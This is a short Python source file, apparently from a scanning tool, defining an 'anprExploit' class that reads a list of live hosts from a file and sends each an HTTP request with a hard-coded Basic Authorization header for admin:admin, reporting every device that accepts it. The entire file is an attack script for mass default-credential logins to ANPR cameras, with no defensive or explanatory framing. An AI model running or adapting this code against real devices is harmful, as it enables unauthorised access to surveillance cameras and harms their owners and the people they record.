import urllib.error
import urllib.request
import os, sys
from host import host
class anprExploit:
    def anprDefaultCreds(self):
        hdr = {'Authorization': 'Basic YWRtaW46YWRtaW4='}
        pathOs = os.path.abspath(os.path.dirname(sys.argv[0]))
        vulnerable_host = open(pathOs + '/host/up_host.txt', 'r').read().splitlines()
        a = 0
        while a < len(vulnerable_host):
            try:
                res = vulnerable_host[a]
                address = host.Host.addressRegex(res)
                url = "http://" + address['ip'] + ":" + str(address['port']) + "/"
                req = urllib.request.Request(url, headers=hdr)
                response = urllib.request.urlopen(req)
                r = response.read()
                if b'cgi-bin' in r:
                    print("[#] Found "+ url + " with admin:admin as credentials")
            except:
                pass
            a += 1
